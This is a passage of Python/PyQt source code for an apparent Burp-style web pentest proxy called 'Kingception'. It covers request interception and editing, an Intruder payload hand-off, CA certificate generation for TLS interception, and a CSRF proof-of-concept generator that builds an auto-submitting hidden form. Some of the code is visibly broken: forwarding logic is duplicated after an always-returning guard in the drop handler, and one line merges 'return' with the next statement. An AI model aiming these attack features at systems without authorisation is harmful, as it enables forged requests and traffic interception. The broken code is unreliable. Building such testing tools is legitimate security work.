            new_method, ok = QInputDialog.getItem(self, "Change Method", "Select new method:", methods, 0, False)
            if ok and new_method:
                lines = raw.split("\n")
                if lines and lines[0].split()[0].upper() in ("GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE"):
                    parts = lines[0].split()
                    if len(parts) >= 2:
                        parts[0] = new_method
                        lines[0] = " ".join(parts)
                        self.ic_editor.setPlainText("\n".join(lines))
        elif action == a_headers:
            d = QDialog(self)
            d.setWindowTitle("Edit Headers")
            d.resize(640, 420)
            layout = QVBoxLayout(d)
            tbl = QTableWidget(0, 2)
            tbl.setHorizontalHeaderLabels(["Name", "Value"])
            tbl.horizontalHeader().setStretchLastSection(True)
            add_row_btn = QPushButton("➕ Add Row")
            add_row_btn.clicked.connect(lambda: tbl.insertRow(tbl.rowCount()))
            layout.addWidget(add_row_btn)
            for k, v in headers.items():
                row2 = tbl.rowCount()
                tbl.insertRow(row2)
                tbl.setItem(row2, 0, QTableWidgetItem(k))
                tbl.setItem(row2, 1, QTableWidgetItem(v))
            layout.addWidget(tbl)
            btn_box = QDialogButtonBox(QDialogButtonBox.StandardButton.Ok | QDialogButtonBox.StandardButton.Cancel)
            btn_box.accepted.connect(d.accept)
            btn_box.rejected.connect(d.reject)
            layout.addWidget(btn_box)
            if d.exec() == QDialog.DialogCode.Accepted:
                new_headers = {}
                for row2 in range(tbl.rowCount()):
                    name2  = tbl.item(row2, 0).text() if tbl.item(row2, 0) else ""
                    value2 = tbl.item(row2, 1).text() if tbl.item(row2, 1) else ""
                    if name2.strip():
                        new_headers[name2.strip()] = value2.strip()
                lines = raw.split("\n")
                header_end = 0
                for i, line in enumerate(lines):
                    if not line.strip():
                        header_end = i
                        break
                new_lines = lines[:1]
                for k, v in new_headers.items():
                    new_lines.append(f"{k}: {v}")
                new_lines.append("")
                if header_end + 1 < len(lines):
                    new_lines.extend(lines[header_end + 1:])
                self.ic_editor.setPlainText("\n".join(new_lines))
        elif action == a_beautify:
            body_str = decode_body(body)
            try:
                parsed = json.loads(body_str)
                pretty = json.dumps(parsed, indent=2)
                lines = raw.split("\n")
                header_end = next((i for i, l in enumerate(lines) if not l.strip()), len(lines))
                new_lines = lines[:header_end + 1] + [pretty]
                self.ic_editor.setPlainText("\n".join(new_lines))
                self._log("Body beautified as JSON")
            except Exception:
                try:
                    import xml.dom.minidom as minidom
                    dom = minidom.parseString(body_str.encode())
                    pretty = dom.toprettyxml(indent="  ")
                    lines = raw.split("\n")
                    header_end = next((i for i, l in enumerate(lines) if not l.strip()), len(lines))
                    new_lines = lines[:header_end + 1] + [pretty]
                    self.ic_editor.setPlainText("\n".join(new_lines))
                    self._log("Body beautified as XML")
                except Exception:
                    QMessageBox.information(self, "Beautify", "Body is not valid JSON or XML")
        elif action == a_copy_url:
            QApplication.clipboard().setText(pr.url)
            self._log("URL copied")
        elif action == a_curl:
            curl = f"curl -X {pr.method} '{pr.url}'"
            for k, v in headers.items():
                if k.lower() != "content-length":
                    curl += f" \\\n  -H '{k}: {v}'"
            if body:
                curl += f" \\\n  -d '{decode_body(body)}'"
            curl += " \\\n  -k"
            QApplication.clipboard().setText(curl)
            self._log("cURL copied")
        elif action == a_copy_req:
            QApplication.clipboard().setText(raw)
            self._log("Raw request copied")
        elif action == a_python:
            h_repr = repr({k: v for k, v in headers.items() if k.lower() != "content-length"})
            body_str = decode_body(body)
            code = (
                "import requests\n\n"
                f"url = {repr(pr.url)}\n"
                f"headers = {h_repr}\n"
                + (f"data = {repr(body_str)}\n\n" if body_str else "\n")
                + f"response = requests.{pr.method.lower()}(\n"
                "    url, headers=headers,"
                + (" data=data," if body_str else "")
                + " verify=False\n)\nprint(response.status_code, response.text[:500])\n"
            )
            QApplication.clipboard().setText(code)
            self._log("Python snippet copied")
        elif action == a_scope:
            host = urlparse(pr.url).hostname or ""
            if host:
                lines = self.scope_edit.toPlainText().strip().split("\n")
                if host not in lines:
                    lines.append(host)
                    self.scope_edit.setPlainText("\n".join(lines))
                    self._save_scope()
                    self._log(f"Added to scope: {host}")
        elif action == a_note:
            mid = pr.mid
            current = self._msg_notes.get(mid, "")
            note, ok = QInputDialog.getMultiLineText(self, "Note", "Add a note:", current)
            if ok:
                self._msg_notes[mid] = note
        elif action == a_csrf:
            body_str = decode_body(body)
            fields = []
            for pair in body_str.split("&"):
                if "=" in pair:
                    k2, v2 = pair.split("=", 1)
                    fields.append((url_unquote(k2), url_unquote(v2)))
            inputs = "\n".join(f'  <input type="hidden" name="{k2}" value="{v2}">' for k2, v2 in fields)
            poc = (
                f'<!DOCTYPE html>\n<html><body>\n<h2>CSRF PoC — Kingception</h2>\n'
                f'<form action="{pr.url}" method="{pr.method}" id="csrf">\n{inputs}\n'
                f'  <input type="submit" value="Submit CSRF">\n</form>\n'
                f'<script>document.getElementById("csrf").submit();</script>\n'
                f'</body></html>'
            )
            QApplication.clipboard().setText(poc)
            self._log("CSRF PoC copied to clipboard")
        elif action == a_open:
            webbrowser.open(pr.url)
        elif action == a_save:
            path, _ = QFileDialog.getSaveFileName(self, "Save Request", "request.txt", "Text (*.txt)")
            if path:
                with open(path, "w", encoding="utf-8") as f:
                    f.write(raw)
                self._log(f"Request saved: {path}")

    def _parse_raw_request(self, raw: str) -> Tuple[dict, Optional[bytes]]:
        # Normalise line endings — QPlainTextEdit may use \r\n on some platforms
        raw = raw.replace('\r\n', '\n').replace('\r', '\n')
        lines = raw.split('\n')
        headers: dict = {}
        body_start: int = len(lines)          # sentinel = "no blank line found"

        # Parse header lines (skip line 0 = request-line)
        for i, line in enumerate(lines[1:], start=1):
            if line.strip() == '':            # blank line = end of headers
                body_start = i + 1
                break
            if ':' in line:
                k, v = line.split(':', 1)
                headers[k.strip()] = v.strip()

        # Anything after the blank line is the body
        if body_start < len(lines):
            # Real CRLF between body lines — matches actual HTTP wire
            # semantics. Without this, a deliberately multi-line raw body
            # (e.g. a request-smuggling test payload embedding what looks
            # like a second request) gets sent with bare LF internally,
            # undercounting Content-Length by 1 byte per internal line
            # break compared to what a real client — or Burp — sends.
            # Safe for ordinary single-line bodies (JSON/form/etc.) since
            # there's nothing to join when there's only one line, and safe
            # for pretty-printed multi-line JSON/XML since both formats
            # treat \r\n and \n as equivalent whitespace.
            body_text = '\r\n'.join(lines[body_start:])
            # Only treat as None if there is genuinely nothing there
            body: Optional[bytes] = body_text.encode('utf-8', 'replace') if body_text else None
        else:
            body = None

        return headers, body

    # ---------- Signal Connections ----------
    def _connect_signals(self):
        self.ic_btn.toggled.connect(self._toggle_intercept)
        self.intercept.req_captured.connect(self._on_req_captured)
        self.ic_fwd.clicked.connect(self._ic_forward)
        self.ic_drop.clicked.connect(self._ic_drop)
        self.ic_req_filter.textChanged.connect(
            lambda txt: setattr(self.proxy, '_intercept_url_filter', txt.strip()))
        self.search_box.textChanged.connect(self._filter_proxy_tree)
        self.f_method.currentTextChanged.connect(self._filter_proxy_tree)
        self.f_status.currentTextChanged.connect(self._filter_proxy_tree)
        self.clear_btn.clicked.connect(self._clear)
        self.export_btn.clicked.connect(self._quick_export)
        # proxy_tree click/ctx already connected inside _traffic_tab
        self.proxy.msg_received.connect(self._on_msg)
        self.proxy.err.connect(lambda e: self._log(f"[ERR] {e}"))
        self.proxy.started.connect(lambda p: self._log("Proxy started on 127.0.0.1:8080"))

    # ---------- Intercept Control ----------
    def _toggle_intercept(self, on: bool):
        self.intercept.toggle(on)
        self.ic_btn.setText(f"Intercept {'ON' if on else 'OFF'}")
        if on:
            self.ic_banner.setText("  ● Intercept ON — requests will pause in the queue above")
            self.ic_banner.setStyleSheet(
                f"background:{T.GREEN}18;color:{T.GREEN};"
                f"font-size:11px;padding:0 12px;border-bottom:1px solid {T.GREEN}44;")
        else:
            self.ic_banner.setText("  Intercept is OFF")
            self.ic_banner.setStyleSheet(
                f"background:{T.SURFACE};color:{T.TXT3};"
                f"font-size:11px;padding:0 12px;border-bottom:1px solid {T.BORDER};")
            if hasattr(self, '_ic_queue'):
                self._ic_queue.clear()
                self.ic_queue_tbl.setRowCount(0)
                self.ic_queue_lbl.setText("0 queued")
        for _b in [self.ic_fwd, self.ic_drop, self.ic_fwd_all, self.ic_drop_all,
                   self.ic_beautify_btn, self.ic_action_btn]:
            _b.setEnabled(False)
        self._log(f"Intercept {'ON' if on else 'OFF'}")

    def _on_req_captured(self, pi):
        """Called from background thread via signal — add to queue table."""
        self.tabs.setCurrentIndex(1)   # Switch to Intercept tab
        row = self._ic_queue_add(pi)
        # Auto-select if it's the first/only item
        if self.ic_queue_tbl.currentRow() < 0:
            self.ic_queue_tbl.setCurrentCell(row, 0)
        self.ic_banner.setText(
            f"  ● {self.ic_queue_tbl.rowCount()} request(s) intercepted — "
            f"select a row and click Forward or Drop")
        self.ic_banner.setStyleSheet(
            f"background:{T.YELLOW}18;color:{T.YELLOW};"
            f"font-size:11px;padding:0 12px;border-bottom:1px solid {T.YELLOW}44;")
        for _b in [self.ic_fwd_all, self.ic_drop_all]:
            _b.setEnabled(True)

    def _ic_forward(self):
        if not self._cur_req_pi:
            return
        pi = self._cur_req_pi
        tab = self.ic_view_tabs.currentIndex()
        if tab == 2:
            self._ic_replace_body_in_raw(self.ic_editor.toPlainText(),
                                         self.ic_body_edit.toPlainText())
        raw = self.ic_editor.toPlainText()
        headers, body = self._parse_raw_request(raw)
        if tab == 2:
            bt = self.ic_body_edit.toPlainText()
            body = bt.encode('utf-8','replace') if bt else None
        self.intercept.forward(pi.mid, headers or None, body)
        self._ic_queue_remove_row_by_mid(pi.mid)
        self._cur_req_pi = None
        self.ic_editor.clear()
        self.ic_body_edit.blockSignals(True); self.ic_body_edit.clear()
        self.ic_body_edit.blockSignals(False)
        self.ic_cl_live.setText("0 B")
        for _b in [self.ic_fwd, self.ic_drop, self.ic_action_btn, self.ic_beautify_btn]:
            _b.setEnabled(False)
        if self.ic_queue_tbl.rowCount() == 0:
            self.ic_banner.setText("  ✅ All requests forwarded")
            self.ic_banner.setStyleSheet(
                f"background:{T.GREEN}18;color:{T.GREEN};"
                f"font-size:11px;padding:0 12px;border-bottom:1px solid {T.GREEN}44;")

    def _ic_drop(self):
        if not self._cur_req_pi:
            return
        pi = self._cur_req_pi
        self.intercept.drop(pi.mid)
        self._ic_queue_remove_row_by_mid(pi.mid)
        self._cur_req_pi = None
        self.ic_editor.clear()
        self.ic_body_edit.blockSignals(True); self.ic_body_edit.clear()
        self.ic_body_edit.blockSignals(False)
        self.ic_cl_live.setText("0 B")
        for _b in [self.ic_fwd, self.ic_drop, self.ic_action_btn, self.ic_beautify_btn]:
            _b.setEnabled(False)
        if self.ic_queue_tbl.rowCount() == 0:
            self.ic_banner.setText("  ❌ Request dropped")
            self.ic_banner.setStyleSheet(
                f"background:{T.RED}18;color:{T.RED};"
                f"font-size:11px;padding:0 12px;border-bottom:1px solid {T.RED}44;")
        if not self._cur_req_pi:
            return
        tab = self.ic_view_tabs.currentIndex()
        if tab == 2:
            self._ic_replace_body_in_raw(self.ic_editor.toPlainText(),
                                         self.ic_body_edit.toPlainText())
        raw = self.ic_editor.toPlainText()
        headers, body = self._parse_raw_request(raw)
        if tab == 2:
            body_txt = self.ic_body_edit.toPlainText()
            body = body_txt.encode('utf-8','replace') if body_txt else None
        self.intercept.forward(self._cur_req_pi.mid, headers or None, body)
        self._cur_req_pi = None
        self.ic_editor.clear()
        self.ic_body_edit.blockSignals(True); self.ic_body_edit.clear()
        self.ic_body_edit.blockSignals(False)
        self.ic_banner.setText("  ✅ Request forwarded")
        self.ic_banner.setStyleSheet(
            f"background:{T.GREEN}15;color:{T.GREEN};"
            f"font-size:11px;padding:0 12px;border-bottom:1px solid {T.GREEN}44;")
        # # self.ic_info_lbl.setText(""); self.ic_method_lbl.setText("")  # removed widget  # removed widget
        # self.ic_url_lbl.setText(""); self.ic_cl_live.setText("0 B")  # removed widget
        for b in [self.ic_fwd, self.ic_drop, self.ic_fwd_all, self.ic_drop_all,
                  self.ic_beautify_btn, self.ic_action_btn]:
            b.setEnabled(False)

    # ---------- Proxy Tree Handling ----------
    def _gen_csrf_from_msg(self, msg: dict):
        """Generate CSRF PoC from a captured message and switch to Attack Tools."""
        rh = safe_json(msg.get("req_headers", "{}"))
        rb = decode_body(msg.get("req_body", ""))
        host = msg.get("host", "target.com")
        raw = f"{msg['method']} {msg.get('path','/')} HTTP/1.1\nHost: {host}\n"
        for k, v in rh.items():
            raw += f"{k}: {v}\n"
        if rb:
            raw += "\n" + rb
        self._csrf_req.setPlainText(raw)
        self._gen_csrf()
        self.tabs.setCurrentIndex(8)  # Logger

    def _on_msg(self, msg: dict):
        # Run extension hooks
        msg = self.ext_sys.run_response_hooks(msg)
        # WebSocket detection
        self.ws_tracker.check_message(msg)
        # Logger tab row
        self._logger_add_row(msg)

        n = self.proxy_tree.topLevelItemCount() + 1
        item = QTreeWidgetItem()
        item.setText(0, str(n))
        item.setText(1, msg.get('method', ''))
        host   = msg.get('host', '')
        url    = msg.get('url', '')
        status = msg.get('status', 0)
        ct     = msg.get('content_type', '')
        item.setText(2, host)
        # Col 3 = path only (not full URL — keeps table narrow)
        item.setText(3, msg.get('path', url)[:120])
        item.setText(4, str(status))
        item.setText(5, pretty_size(msg.get('resp_size', 0)))
        item.setText(6, f"{msg.get('dur', 0):.2f}s")
        item.setText(7, ct[:40])
        item.setForeground(1, QBrush(QColor(method_color(msg.get('method', '')))))
        item.setForeground(4, QBrush(QColor(status_color(status))))
        item.setData(0, Qt.ItemDataRole.UserRole, msg['id'])
        self.proxy_tree.addTopLevelItem(item)
        if self._autoscroll:
            self.proxy_tree.scrollToBottom()
        self._apply_filter(item)
        # Update traffic counter label
        if hasattr(self, '_traffic_count_lbl'):
            self._traffic_count_lbl.setText(f"{n} requests")

    def _apply_filter(self, item):
        mf = self.f_method.currentText()
        sf = self.f_status.currentText()
        qf = self.search_box.text().lower()
        hf = self._host_filter
        m = item.text(1)
        sc = item.text(4)
        url = item.text(3).lower()
        host = item.text(2)
        show = True
        if mf != "All" and m != mf:
            show = False
        if show and sf != "All":
            try:
                lo = int(sf[0]) * 100
                show = (lo <= int(sc) < lo + 100)
            except Exception:
                pass
        if show and qf and qf not in url and qf not in host.lower():
            show = False
        if show and hf and hf not in host:
            show = False
        item.setHidden(not show)

    def _filter_proxy_tree(self):
        for i in range(self.proxy_tree.topLevelItemCount()):
            self._apply_filter(self.proxy_tree.topLevelItem(i))

    def _on_tree_click(self, item, col):
        mid = item.data(0, Qt.ItemDataRole.UserRole)
        msg = self.db.get_msg(mid)
        if not msg:
            return
        rh = safe_json(msg.get('req_headers', '{}'))
        req = f"{msg['method']} {msg['path']} HTTP/1.1\n"
        for k, v in rh.items():
            req += f"{k}: {v}\n"
        rb = msg.get('req_body')
        if rb:
            req += "\n" + decode_body(rb)
        self.req_view.setPlainText(req)
        sh = safe_json(msg.get('resp_headers', '{}'))
        resp = f"HTTP/1.1 {msg.get('status', 0)}\n"
        for k, v in sh.items():
            resp += f"{k}: {v}\n"
        rsb = msg.get('resp_body')
        if rsb:
            resp += "\n" + decode_body(rsb)[:60000]
        self.resp_view.setPlainText(resp)

    def _proxy_ctx(self, pos):
        item = self.proxy_tree.itemAt(pos)
        if not item:
            return
        mid = item.data(0, Qt.ItemDataRole.UserRole)
        msg = self.db.get_msg(mid)
        if not msg:
            return
        menu = QMenu()

        # --- Send to tools ---
        send_menu = menu.addMenu("📤 Send To")
        a_rep  = send_menu.addAction("🔁 Repeater")
        a_int  = send_menu.addAction("💣 Intruder")
        a_comp = send_menu.addAction("⚖ Comparer (A)")
        a_jwt  = send_menu.addAction("🔑 JWT Analyzer")
        a_scan = send_menu.addAction("🔍 Scanner")
        menu.addSeparator()

        # --- Request manipulation ---
        a_method = menu.addAction("🔄 Change Request Method")
        a_edit   = menu.addAction("✏ Edit & Replay in Repeater")
        menu.addSeparator()

        # --- Copy actions ---
        copy_menu = menu.addMenu("📋 Copy")
        a_url    = copy_menu.addAction("Copy URL")
        a_curl   = copy_menu.addAction("Copy as cURL")
        a_req    = copy_menu.addAction("Copy Request (raw)")
        a_resp   = copy_menu.addAction("Copy Response (raw)")
        a_python = copy_menu.addAction("Copy as Python requests")
        menu.addSeparator()

        # --- Highlight / color ---
        hl_menu = menu.addMenu("🎨 Highlight")
        hl_colors = [
            ("🔴 Red",    "#ef4444"),
            ("🟠 Orange", "#f97316"),
            ("🟡 Yellow", "#eab308"),
            ("🟢 Green",  "#22c55e"),
            ("🔵 Blue",   "#3b82f6"),
            ("🟣 Purple", "#a855f7"),
            ("⬜ None",   ""),
        ]
        hl_actions = {}
        for label, color in hl_colors:
            hl_actions[hl_menu.addAction(label)] = color
        menu.addSeparator()

        # --- Scope / note ---
        a_scope_add = menu.addAction("✅ Add to Scope")
        a_scope_del = menu.addAction("❌ Remove from Scope")
        a_note      = menu.addAction("📝 Add / Edit Note")
        menu.addSeparator()

        # --- Generate PoCs ---
        poc_menu = menu.addMenu("⚡ Generate PoC")
        a_csrf   = poc_menu.addAction("🛡 CSRF PoC")
        a_cj     = poc_menu.addAction("🖱 Clickjacking PoC")
        menu.addSeparator()

        # --- Save / open ---
        a_save = menu.addAction("💾 Save Item to File")
        a_open = menu.addAction("🌐 Open URL in Browser")
        a_del  = menu.addAction("🗑 Delete")

        action = menu.exec(self.proxy_tree.viewport().mapToGlobal(pos))
        if not action:
            return

        if action == a_rep:
            self._send_to_rep(msg)
        elif action == a_int:
            self._send_to_int(msg)
        elif action == a_comp:
            rh = safe_json(msg.get("resp_headers", "{}"))
            rb = decode_body(msg.get("resp_body", ""))
            resp_text = f"HTTP/1.1 {msg.get('status', 0)}\n"
            for k, v in rh.items():
                resp_text += f"{k}: {v}\n"
            resp_text += "\n" + rb[:60000]
            pass  # comp_a/comp_b removed with Comparer tab
            # self.tabs.setCurrentIndex(5)  # Decoder
        elif action == a_jwt:
            rh = safe_json(msg.get("req_headers", "{}"))
            auth = rh.get("Authorization", rh.get("authorization", ""))
            if "Bearer" in auth:
                token = auth.split("Bearer", 1)[1].strip()
                self.jwt_input.setPlainText(token)
                self.tabs.setCurrentIndex(6)  # Settings
        elif action == a_scan:
            self.scan_url.setText(msg["url"])
            self.tabs.setCurrentIndex(4)
        elif action == a_method:
            methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE"]
            cur = msg.get("method", "GET")
            cur_idx = methods.index(cur) if cur in methods else 0
            new_method, ok = QInputDialog.getItem(self, "Change Method",
                                                   "Select new HTTP method:", methods, cur_idx, False)
            if ok and new_method:
                msg2 = dict(msg)
                msg2["method"] = new_method
                self._send_to_rep(msg2)
                self._log(f"Changed method to {new_method} → sent to Repeater")
        elif action == a_edit:
            self._send_to_rep(msg)
        elif action == a_url:
            QApplication.clipboard().setText(msg["url"])
        elif action == a_curl:
            QApplication.clipboard().setText(self._to_curl(msg))
            self._log("cURL copied to clipboard")
        elif action == a_req:
            rh = safe_json(msg.get("req_headers", "{}"))
            raw = f"{msg['method']} {msg.get('path','/')} HTTP/1.1\n"
            for k, v in rh.items():
                raw += f"{k}: {v}\n"
            rb = msg.get("req_body")
            if rb:
                raw += "\n" + decode_body(rb)
            QApplication.clipboard().setText(raw)
            self._log("Request copied")
        elif action == a_resp:
            sh = safe_json(msg.get("resp_headers", "{}"))
            raw = f"HTTP/1.1 {msg.get('status', 0)}\n"
            for k, v in sh.items():
                raw += f"{k}: {v}\n"
            rsb = msg.get("resp_body")
            if rsb:
                raw += "\n" + decode_body(rsb)[:60000]
            QApplication.clipboard().setText(raw)
            self._log("Response copied")
        elif action == a_python:
            rh = safe_json(msg.get("req_headers", "{}"))
            h_repr = repr({k: v for k, v in rh.items() if k.lower() not in ("content-length",)})
            rb = msg.get("req_body")
            body_repr = repr(decode_body(rb)) if rb else "None"
            code = (
                "import requests\n\n"
                f"url = {repr(msg['url'])}\n"
                f"headers = {h_repr}\n"
                f"data = {body_repr}\n\n"
                f"response = requests.{msg.get('method','GET').lower()}(\n"
                "    url, headers=headers,"
                + (" data=data," if rb else "")
                + " verify=False\n)\nprint(response.status_code, response.text[:500])\n"
            )
            QApplication.clipboard().setText(code)
            self._log("Python snippet copied")
        elif action in hl_actions:
            color = hl_actions[action]
            self._msg_colors[mid] = color
            if color:
                for col in range(self.proxy_tree.columnCount()):
                    it = item.foreground(col)
                    item.setBackground(col, QBrush(QColor(color + "33")))
            else:
                for col in range(self.proxy_tree.columnCount()):
                    item.setBackground(col, QBrush())
        elif action == a_scope_add:
            host = msg.get("host", "")
            lines = self.scope_edit.toPlainText().strip().split("\n")
            if host and host not in lines:
                lines.append(host)
                self.scope_edit.setPlainText("\n".join(lines))
                self._save_scope()
                self._log(f"Added to scope: {host}")
        elif action == a_scope_del:
            host = msg.get("host", "")
            lines = [l for l in self.scope_edit.toPlainText().split("\n") if host not in l]
            self.scope_edit.setPlainText("\n".join(lines))
            self._save_scope()
            self._log(f"Removed from scope: {host}")
        elif action == a_note:
            current = self._msg_notes.get(mid, "")
            note, ok = QInputDialog.getMultiLineText(self, "Note", "Add a note for this request:", current)
            if ok:
                self._msg_notes[mid] = note
                if note:
                    item.setToolTip(0, f"📝 {note}")
                self._log(f"Note saved for {msg.get('url','')[:60]}")
        elif action == a_csrf:
            self._gen_csrf_from_msg(msg)
        elif action == a_cj:
            self._cj_url.setText(msg.get("url", ""))
            self._gen_cj()
            self.tabs.setCurrentIndex(7)
        elif action == a_save:
            path, _ = QFileDialog.getSaveFileName(self, "Save Item", f"request_{mid[:8]}.txt", "Text (*.txt)")
            if path:
                rh = safe_json(msg.get("req_headers", "{}"))
                raw = f"=== REQUEST ===\n{msg['method']} {msg.get('path','/')} HTTP/1.1\n"
                for k, v in rh.items():
                    raw += f"{k}: {v}\n"
                rb = msg.get("req_body")
                if rb:
                    raw += "\n" + decode_body(rb)
                raw += "\n\n=== RESPONSE ===\n"
                sh = safe_json(msg.get("resp_headers", "{}"))
                raw += f"HTTP/1.1 {msg.get('status', 0)}\n"
                for k, v in sh.items():
                    raw += f"{k}: {v}\n"
                rsb = msg.get("resp_body")
                if rsb:
                    raw += "\n" + decode_body(rsb)[:60000]
                with open(path, "w", encoding="utf-8") as f:
                    f.write(raw)
                self._log(f"Saved: {path}")
        elif action == a_open:
            webbrowser.open(msg.get("url", ""))
        elif action == a_del:
            self.proxy_tree.takeTopLevelItem(self.proxy_tree.indexOfTopLevelItem(item))

    def _send_to_rep(self, msg: dict):
        rh = safe_json(msg.get('req_headers', '{}'))
        # Build a proper raw HTTP request string — same format as what a browser sends
        method  = msg.get('method', 'GET')
        url     = msg.get('url', '')
        body    = decode_body(msg.get('req_body', '')) or ''
        path    = msg.get('path', '/')
        if not path:
            from urllib.parse import urlparse as _up
            _p = _up(url)
            path = (_p.path or '/') + (('?' + _p.query) if _p.query else '')
        raw_lines = [f"{method} {path} HTTP/1.1"]
        for k, v in rh.items():
            if k.lower() not in ('content-length', 'transfer-encoding'):
                raw_lines.append(f"{k}: {v}")
        if body:
            raw_lines.append(f"Content-Length: {len(body.encode('utf-8'))}")
        raw_lines.append("")   # blank line
        raw_lines.append(body)
        raw_request = '\n'.join(raw_lines)
        self._add_rep_tab(
            title=url[8:].split('/')[0][:26] if '://' in url else url[:26],
            method=method,
            url=url,
            raw_request=raw_request
        )
        self.tabs.setCurrentIndex(2)

    def _send_to_int(self, msg: dict):
        rh = safe_json(msg.get('req_headers', '{}'))
        h_text = "\n".join(f"{k}: {v}" for k, v in rh.items() if k.lower() != 'content-length')
        self.intr_url.setText(msg['url'])
        self.intr_method.setCurrentText(msg['method'])
        self.intr_headers.setPlainText(h_text)
        self.intr_body.setPlainText(decode_body(msg.get('req_body', '')) or '{"key":"§PAYLOAD§"}')
        self.tabs.setCurrentIndex(3)
        self._log("Sent to Intruder. Mark injection point with §PAYLOAD§ then Start Attack.")

    def _to_curl(self, msg: dict) -> str:
        h = safe_json(msg.get('req_headers', '{}'))
        parts = [f"curl -X {msg['method']} '{msg['url']}'"]
        for k, v in h.items():
            if k.lower() != 'content-length':
                parts.append(f"  -H '{k}: {v}'")
        body = msg.get('req_body')
        if body:
            parts.append(f"  -d '{decode_body(body)}'")
        parts.append("  -k")
        return " \\\n".join(parts)

    # ---------- CA, Rules, Scope ----------
    def _gen_ca(self):
        if not HAS_CRYPTO:
            QMessageBox.critical(self, "Missing dependency",
                "Install the cryptography package first:\n\n  pip install cryptography")
            return
        try:
            crt, key = self.proxy.certs.generate_ca()
            self.ca_lbl.setText(f"✅ {crt}")
            self.ca_lbl.setStyleSheet(f"color:{T.GREEN}")
            QMessageBox.information(self, "✅ Kingception CA Generated",
                f"Certificate saved to:\n  {crt}\n\n"
                f"Private key (keep secret):\n  {key}\n\n"
                "── NEXT STEPS ──────────────────────────────────\n"
                "Firefox:\n"
                "  Settings → Privacy → Certificates → View Certificates\n"
                "  Authorities → Import → select the .crt file above\n"
                "  ☑ Trust to identify websites → OK\n\n"
                "Chrome/Chromium:\n"
                "  Settings → Privacy → Security → Manage certificates\n"
                "  Authorities → Import → select the .crt file above\n\n"
                "Kali system-wide:\n"
                "  sudo cp <path> /usr/local/share/ca-certificates/kingception-ca.crt\n"
                "  sudo update-ca-certificates\n\n"
                "Restart browser after importing!")
            self._log(f"CA cert generated: {crt}")
        except Exception as e:
            QMessageBox.critical(self, "Error generating CA", str(e))

    def _add_rule(self):
        @dataclass
        class MRule:
            id: str; name: str; pattern: str; replace: str
            apply_to: str; scope: str; enabled: bool; is_regex: bool
        d = QDialog(self)
        d.setWindowTitle("Add Rule")
        d.resize(500, 320)
        fl = QFormLayout(d)
        fl.setContentsMargins(16, 16, 16, 16)
        name = QLineEdit()
        fl.addRow("Name:", name)
        patt = QLineEdit()
        fl.addRow("Pattern:", patt)
        repl = QLineEdit()
        fl.addRow("Replace with:", repl)
        at = QComboBox()
        at.addItems(["both", "request", "response"])
        fl.addRow("Apply to:", at)
        sc = QComboBox()
        sc.addItems(["body", "headers", "both"])
        fl.addRow("Scope:", sc)
        rx = QCheckBox("Use Regex")
        fl.addRow("", rx)
        btns = QDialogButtonBox(QDialogButtonBox.StandardButton.Ok | QDialogButtonBox.StandardButton.Cancel)
        btns.accepted.connect(d.accept)
        btns.rejected.connect(d.reject)
        fl.addRow(btns)
        if d.exec() == QDialog.DialogCode.Accepted:
            rule = MRule(str(uuid.uuid4()), name.text(), patt.text(), repl.text(),
                         at.currentText(), sc.currentText(), True, rx.isChecked())
            self.proxy.rules.append(rule)
            self.db.save_rule(rule)
            self._refresh_rules()
            self._log(f"Rule added: {rule.name}")

    def _del_rule(self):
        row = self.rules_tbl.currentRow()
        if row < 0:
            return
        if row < len(self.proxy.rules):
            self.proxy.rules.pop(row)
        self.rules_tbl.removeRow(row)

    def _refresh_rules(self):
        if not hasattr(self, 'rules_tbl'):
            return        self.rules_tbl.setRowCount(0)
        for r in self.proxy.rules:
            row = self.rules_tbl.rowCount()
            self.rules_tbl.insertRow(row)
            for c, val in enumerate([r.name, r.pattern, r.replace, r.apply_to, r.scope,
                                     "✓" if r.is_regex else "✗"]):
                self.rules_tbl.setItem(row, c, QTableWidgetItem(val))

    def _save_scope(self):
        @dataclass
        class SRule:
            id: str; pattern: str; rule_type: str; enabled: bool
        self.proxy.scope.clear()
        for line in self.scope_edit.toPlainText().strip().split('\n'):
            line = line.strip()
            if not line:
                continue
            exc = line.startswith('!')
            self.proxy.scope.append(SRule(str(uuid.uuid4()), line[1:] if exc else line,
                                          'exclude' if exc else 'include', True))
        self._log(f"Scope: {len(self.proxy.scope)} rules")

    # =========================================================
    # CORE UTILITY METHODS — _btn, _log, _clear, stats, theme
    # =========================================================

    def _btn(self, label: str, style: str = None, h: int = 28, w: int = None) -> QPushButton:
        """Factory for consistently styled buttons."""
        b = QPushButton(label)
        b.setFixedHeight(h)
        if w:
            b.setFixedWidth(w)
        if style:
            b.setObjectName(style)
        return b

    def _log(self, msg: str):
        """Append a timestamped message to the status bar and logger view."""
        import datetime as _dt
        ts = _dt.datetime.now().strftime('%H:%M:%S')
        line = f"[{ts}]  {msg}"
        # Status bar
        if hasattr(self, 'statusBar'):
            try:
                self.statusBar().showMessage(line, 8000)
            except Exception:
                pass
        # Logger widget
        if hasattr(self, 'logger_view'):
            try:
                self.logger_view.appendPlainText(line)
            except Exception:
                pass

    def _clear(self):
        """Clear the traffic history tree and in-memory recent list."""
        self.proxy_tree.clear()
        self.db.recent.clear()
        if hasattr(self, '_traffic_count_lbl'):
            self._traffic_count_lbl.setText("0 requests")
        self.req_view.clear()
        self.resp_view.clear()
        self._log("Traffic history cleared")

    def _quick_export(self):
        """Quick export traffic to CSV."""
        path, _ = QFileDialog.getSaveFileName(
            self, "Export Traffic", "kingception_traffic.csv",
            "CSV (*.csv);;All (*.*)")
        if not path:
            return
        import csv as _csv
        msgs = list(self.db.recent)
        with open(path, 'w', newline='', encoding='utf-8') as f:
            w = _csv.writer(f)
            w.writerow(["#", "Method", "Host", "Path", "Status",
                        "Size", "Duration", "Content-Type", "URL"])
            for i, m in enumerate(msgs, 1):
                w.writerow([
                    i,
                    m.get('method', ''),
                    m.get('host', ''),
                    m.get('path', ''),
                    m.get('status', ''),
                    m.get('resp_size', 0),
                    round(m.get('dur', 0), 3),
                    m.get('content_type', ''),
                    m.get('url', ''),
                ])
        self._log(f"Exported {len(msgs)} rows → {path}")

    def _update_stats(self):
        """Called every second by the stats timer — update status bar."""
        if not hasattr(self, 'proxy') or not self.proxy:
            return
        n = self.proxy_tree.topLevelItemCount()
        status = f"  Proxy: 127.0.0.1:8080  |  {n} requests  |  " \
                 f"Intercept: {'ON' if self.intercept.enabled else 'OFF'}"
        try:
            self.statusBar().showMessage(status)
